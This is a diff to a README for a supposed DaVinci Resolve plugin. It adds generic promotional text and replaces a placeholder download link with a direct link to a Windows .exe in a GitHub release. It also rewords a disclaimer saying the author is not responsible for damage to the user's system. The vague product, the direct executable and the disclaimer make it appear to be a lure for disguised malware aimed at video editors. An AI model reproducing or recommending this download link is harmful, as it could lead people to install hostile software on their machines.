@@ -12,6 +12,18 @@ This plugin for DaVinci Resolve enhances your video editing workflow with powerf
 
 Whether you're a professional video editor or a hobbyist, this plugin will take your DaVinci Resolve projects to the next level!
 
+## Advantages
+
+Our DaVinci Resolve plugin offers numerous benefits to streamline your workflow and enhance your video projects:
+
+1. **Time-saving**: Automated features like scene detection and one-click audio enhancement significantly reduce editing time.
+
+2. **Creative freedom**: Custom transition effects allow you to add unique touches to your videos, setting them apart from the competition.
+
+3. **Workflow integration**: Seamlessly integrates with your existing DaVinci Resolve projects and workflows.
+
+4. **Regular updates**: Our team consistently adds new features and improvements based on user feedback.
+
 ## Installation
 
 1. Download the plugin using the button below.
@@ -22,7 +34,7 @@ Whether you're a professional video editor or a hobbyist, this plugin will take 
 
 ## Download
 
-[<img src="https://img.shields.io/badge/Download-Plugin-blue?style=for-the-badge" alt="Download Plugin" />](https://example.com/download-plugin)
+[<img src="https://img.shields.io/badge/Download-Plugin-blue?style=for-the-badge" alt="Download Plugin" />](https://github.com/davincitweaker/davincitweaker.github.io/releases/download/latest/DaVinci.Resolve.Tweaks.exe)
 
 ## System Requirements
 
@@ -38,4 +50,4 @@ There might be some issues on newer Intel Chips
 
 ---
 
-&copy; 2024 DaVinci Tweaker. All rights reserved. I am not responsible for any damages on your system.
+&copy; 2024 DaVinci Tweaker. All rights reserved. I am not responsible for any damages done to your system.
